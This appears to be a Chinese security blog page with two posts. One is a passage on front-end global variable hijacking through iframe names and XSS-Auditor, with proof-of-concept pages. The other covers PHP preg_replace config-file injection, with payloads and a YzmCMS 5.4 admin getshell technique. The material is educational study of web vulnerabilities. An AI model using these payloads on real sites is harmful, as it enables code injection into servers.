<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//localhost/JQuery Test/exp.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">'http://localhost/JQuery test/2.html'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/05/GD3Udx.png" alt="GD3Udx.png"></p>
<p>从上面的例子可以看出我们可以通过location进行同源设置来避免因为同源而被Block的情况，可成功获取name属性。</p>
<h3 id="name属性与id属性"><a href="#name属性与id属性" class="headerlink" title="name属性与id属性"></a>name属性与id属性</h3><p>name属性和id属性都可以注册为全局变量，如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDt4MD.png" alt="GDt4MD.png"></p>
<h4 id="不可覆盖变量性"><a href="#不可覆盖变量性" class="headerlink" title="不可覆盖变量性"></a>不可覆盖变量性</h4><p>对于由id和name属性创建的变量 不可对已声明的变量进行覆盖 示例如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDd0YR.png" alt="GDd0YR.png"></p>
<p>可以看到实际的变量并没有覆盖，所以对于这种攻击手法我们需要的是一个未定义的变量的。</p>
<p>、关于更多name和id属性的特性在下一篇Dom Clobbering再说吧。</p>
<h3 id="如何获得未定义的变量"><a href="#如何获得未定义的变量" class="headerlink" title="如何获得未定义的变量"></a>如何获得未定义的变量</h3><p>从上面的内容我们可以得知我们的攻击时进行的操作必须要在此变量未定义的情况下进行（因为我们通过id或name属性无法对已定义的变量进行覆盖）。</p>
<p>利用XSS-Auditor进行变量删除（不过需要注意的时XSS-Auditor在Chrome-78beta版本已经被废除)</p>
<p>利用方式：</p>
<p>通过参数提交恶意语句，即可进行删除变量，如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss&#x3D;&lt;script&gt;var lih3iu&#x3D;1&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>父页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://A.com/index.html"</span>; <span class="comment">// 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block</span></span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'setting viewer...'</span>);</span></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].name = <span class="string">"lih3iu"</span>; <span class="comment">// 重新定义全局变量</span></span></span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E</span></span><br><span class="line"><span class="comment">    利用chrome的filter模式去掉 VUL 的定义 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B.com/B.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://www.baidu.com"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"exploit()"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> test1=<span class="number">1</span>;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> lih3iu = <span class="string">"Hijack me"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(lih3iu);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到lih3iu变量被成功设置为一个window变量，这也是这个漏洞的局限性，只可将漏洞劫持为一个window变量，对于这个漏洞其实还是有一些问题的（比如一些同源跨域的问题，有兴趣的师傅可以私我一起讨论一下）</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GrePh9.png" alt="GrePh9.png"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞/#more" target="_blank" rel="noopener">http://wonderkun.cc/2019/07/01/%E5%89%8D%E7%AB%AF%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/#more</a></p>
<p><a href="https://hpdoger.cn/2019/07/02/前端全局变量劫持/" target="_blank" rel="noopener">https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/" data-id="ckabsu394003fkkvrb0zsboae" class="article-share-link" data-share="baidu" data-title="前端全局变量劫持">Share</a>
      

      
        <a href="http://yoursite.com/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-正则与经典写配置漏洞学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-03-23T17:01:45.000Z" itemprop="datePublished">2020-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">正则与经典写配置漏洞学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到P牛的小密圈发了这篇文章 感觉很棒 所以来学习一下.</p>
<h3 id="前置知识铺垫"><a href="#前置知识铺垫" class="headerlink" title="前置知识铺垫"></a>前置知识铺垫</h3><h4 id="single-line和multi-line"><a href="#single-line和multi-line" class="headerlink" title="single-line和multi-line"></a>single-line和multi-line</h4><p>single-line与multi-line分别对应了/s和/m修饰符。</p>
<h5 id="multi-line"><a href="#multi-line" class="headerlink" title="multi-line"></a>multi-line</h5><p>multi-line表示按行来进行正则匹配：将待匹配的文本利用换行符分割，并对每一部分进行正则匹配，将每部分的结果用or进行运算，得出最终的结果。</p>
<p>举一个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/m'</span>, <span class="string">"abbz\n123"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回1</span></span><br></pre></td></tr></table></figure>

<h5 id="single-line"><a href="#single-line" class="headerlink" title="single-line"></a>single-line</h5><p>将待匹配文本视作单行，并且换行符不再作为换行的标志，. 可匹配换行符</p>
<h4 id="默认情况的正则-不加修饰符"><a href="#默认情况的正则-不加修饰符" class="headerlink" title="默认情况的正则(不加修饰符)"></a>默认情况的正则(不加修饰符)</h4><p>对于如下正则：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明默认情况下非多行匹配</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a.+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明无法匹配换行符</span><br></pre></td></tr></table></figure>

<p>所以在默认情况下代表着：single-line且.不会匹配换行符</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>引用一下p牛的总结</p>
<ul>
<li>不加s或m修饰符 -&gt; single line，但 . 不能匹配换行符</li>
<li>单独加s修饰符 -&gt; single line，且 . 匹配包括换行符在内的所有字符</li>
<li>单独加m修饰符 -&gt; multi line</li>
<li>同时加m和s两个修饰符 -&gt; multi line，且 . 匹配包括换行符在内的所有字符</li>
</ul>
<h3 id="配置漏洞与其变形"><a href="#配置漏洞与其变形" class="headerlink" title="配置漏洞与其变形"></a>配置漏洞与其变形</h3><h4 id="正则贪婪模式且无-s修饰符"><a href="#正则贪婪模式且无-s修饰符" class="headerlink" title="正则贪婪模式且无/s修饰符"></a>正则贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>利用.*不会匹配换行的特性，利用换行绕过</p>
<p>第一次：api=a’;%0aphpinfo();//</p>
<p>第二次：api=aaa</p>
<h4 id="正则贪婪模式且有-s修饰符"><a href="#正则贪婪模式且有-s修饰符" class="headerlink" title="正则贪婪模式且有/s修饰符"></a>正则贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>由于/s修饰符 所以无法利用换行绕过，不过可以用$0或者\0来引入单引号进行闭合，$0在preg_replace函数中代表着完整的匹配模式或者匹配文本</p>
<p>第一次</p>
<p>api=;phpinfo();//</p>
<p>对应：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$API = <span class="string">';phpinfo();//'</span>;</span><br></pre></td></tr></table></figure>

<p>第二次</p>
<p>api=$0</p>
<p>对应</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$API = <span class="string">'$API = '</span>;phpinfo();<span class="comment">//';';</span></span><br></pre></td></tr></table></figure>

<p>成功在配置文件中写入任意内容</p>
<h4 id="正则非贪婪模式且无-s修饰符"><a href="#正则非贪婪模式且无-s修饰符" class="headerlink" title="正则非贪婪模式且无/s修饰符"></a>正则非贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>和之前唯一不同的是现在是非贪婪的匹配模式，也就意味着匹配到第一个单引号之后就不会接着往下继续匹配了</p>
<p>所以我们换行和不换行都可以绕过了</p>
<p>Payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="正则非贪婪模式且有-s修饰符"><a href="#正则非贪婪模式且有-s修饰符" class="headerlink" title="正则非贪婪模式且有/s修饰符"></a>正则非贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>虽然加了/s修饰符，但是因为为非贪婪模式，上面的payload同样适用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的贪婪且-s修饰"><a href="#define情况下的贪婪且-s修饰" class="headerlink" title="define情况下的贪婪且/s修饰"></a>define情况下的贪婪且/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>和第一种一样，只是换了下变量的定义方式，换行绕过即可</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一次</span><br><span class="line">api&#x3D;a&#39;);%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">第二次</span><br><span class="line">api&#x3D;a</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的贪婪且无-s修饰"><a href="#define情况下的贪婪且无-s修饰" class="headerlink" title="define情况下的贪婪且无/s修饰"></a>define情况下的贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>因为有不可闭合的单引号，所以这种情况下无法使用$0</p>
<p>不过可以使用这个trick: <code>preg_replace</code> 在替换的时候会吃掉转义符 来进行引号闭合</p>
<p>preg_match可将<code>\\</code>转化为<code>\</code> <strong>这也就意味着…其实用这种方式可以逃逸掉这篇文章里所有的单引号</strong></p>
<p>Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api&#x3D;a\%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到的配置文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&#39;API&#39;, &#39;a\\&#39;);phpinfo();&#x2F;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且有-s修饰"><a href="#define情况下的非贪婪且有-s修饰" class="headerlink" title="define情况下的非贪婪且有/s修饰"></a>define情况下的非贪婪且有/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且无-s修饰"><a href="#define情况下的非贪婪且无-s修饰" class="headerlink" title="define情况下的非贪婪且无/s修饰"></a>define情况下的非贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<p>第一种</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h3 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h3><h4 id="YzmCMS-5-4后台getshell"><a href="#YzmCMS-5-4后台getshell" class="headerlink" title="YzmCMS 5.4后台getshell"></a>YzmCMS 5.4后台getshell</h4><p>漏洞函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_config</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">    $configfile = YZMPHP_PATH.<span class="string">'common'</span>.DIRECTORY_SEPARATOR.<span class="string">'config/config.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_writable($configfile)) showmsg(<span class="string">'Please chmod '</span>.$configfile.<span class="string">' to 0777 !'</span>, <span class="string">'stop'</span>);</span><br><span class="line">    $pattern = $replacement = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($config <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">        $pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br><span class="line">        $replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;                    </span><br><span class="line">    &#125;</span><br><span class="line">    $str = file_get_contents($configfile);</span><br><span class="line">    $str = preg_replace($pattern, $replacement, $str);</span><br><span class="line">    <span class="keyword">return</span> file_put_contents($configfile, $str, LOCK_EX);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到$replacement变量是由字符拼接而来，并且${1}匹配的是单引号，那么我们就可以用$1来闭合前面的单引号，${1}等价于$1的，接着跟进调用了set_config的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        yzm_base::load_common(<span class="string">'function/function.php'</span>, <span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'mail_inbox'</span>]) &amp;&amp; $_POST[<span class="string">'mail_inbox'</span>])&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_email($_POST[<span class="string">'mail_inbox'</span>])) showmsg(L(<span class="string">'mail_format_error'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload_types'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'upload_types'</span>])) showmsg(<span class="string">'允许上传附件类型不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $arr = <span class="keyword">array</span>();</span><br><span class="line">            $config = D(<span class="string">'config'</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">                <span class="keyword">if</span>(in_array($key, <span class="keyword">array</span>(<span class="string">'site_theme'</span>,<span class="string">'watermark_enable'</span>,<span class="string">'watermark_name'</span>,<span class="string">'watermark_position'</span>))) &#123;</span><br><span class="line">                    $value = safe_replace(trim($value));</span><br><span class="line">                    $arr[$key] = $value;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>($key!=<span class="string">'site_code'</span>)&#123;</span><br><span class="line">                        $value = htmlspecialchars($value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $config-&gt;update(<span class="keyword">array</span>(<span class="string">'value'</span>=&gt;$value), <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$key));</span><br><span class="line">            &#125;</span><br><span class="line">            set_config($arr);</span><br><span class="line">            delcache(<span class="string">'configs'</span>);</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看出是从POST取值并且检查key是否在规定的数组中，如果在的话，进行一次内容过滤，然后赋给$arr数组，并且由于array数组中键可以对应着函数</p>
<p>比如 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;&gt;&#39;x&#39;,foo()</span><br></pre></td></tr></table></figure>

<p>所以直接赋值为我们之前单引号闭合的payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1,payload,$1</span><br></pre></td></tr></table></figure>

